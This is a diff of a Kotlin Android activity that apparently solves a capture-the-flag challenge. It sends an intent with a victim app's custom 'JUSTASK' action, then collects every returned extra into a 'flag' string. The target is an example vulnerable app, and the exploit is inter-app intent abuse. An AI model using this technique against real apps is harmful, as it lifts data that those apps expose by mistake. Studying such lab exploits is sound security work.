@@ -23,11 +23,11 @@ class MainActivity : AppCompatActivity() {
         }
         startActivityForResult(intent, 1)
 
-        // // PartTwo
-        // val sendIntent: Intent = Intent().apply {
-        //     action = "com.example.victimapp.intent.action.JUSTASK"
-        // }
-        // startActivity(sendIntent)
+        // PartTwo
+        val sendIntent: Intent = Intent().apply {
+            action = "com.example.victimapp.intent.action.JUSTASK"
+        }
+        startActivityForResult(sendIntent, 2)
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, intent: Intent?) {
@@ -36,10 +36,9 @@ class MainActivity : AppCompatActivity() {
         val view = findViewById<TextView>(R.id.debug_text)
         // View what keys were put
         intent?.getExtras()?.let { extras ->
-            view.text = "Keys found: " + extras
+            extras
                 .keySet()
-                .fold("") { acc, key -> acc + " " + key }
-            flag += extras.getParcelable("flag")
+                .map { key -> flag += extras.getCharSequence(key) }
             view.text = flag
         }
     }
